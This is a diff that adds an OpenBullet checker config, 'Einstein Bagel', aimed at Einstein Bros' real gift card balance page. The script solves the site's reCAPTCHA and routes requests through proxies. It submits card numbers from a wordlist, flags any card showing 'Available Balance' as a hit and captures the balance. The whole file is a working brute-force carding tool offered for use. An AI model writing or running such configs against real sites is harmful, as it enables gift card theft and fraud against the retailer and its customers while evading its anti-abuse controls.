@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Einstein Bagel",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-03T22:40:24.1688033+01:00",
+  "AdditionalInfo": "",
+  "Author": "Ruzzlzz & Theo",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://shared.einsteinbros.com/giftcard" "6Lfi8iYUAAAAAG05pZc93KMtx4m0O5oX_kqWbqpc" -> VAR "RECAP" 
+REQUEST POST "https://shared.einsteinbros.com/giftcard" AutoRedirect=TRUE 
+  CONTENT "cardNumber=<USER>&pinNumber=&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Ccenrg.BackUrl.Gift.sitecore-shared.einsteinbros.com=https: //shared.einsteinbros.com/giftcard" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://shared.einsteinbros.com" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Available Balance" 
+  KEYCHAIN Failure OR 
+    KEY "The card number you entered is not valid" 
+PARSE "<SOURCE>" REGEX "Available Balance</strong></p>\s*<p class=\"h1\">\W([^<]*)" "[1]" Recursive=FALSE -> CAP "CAP" "$" "" 
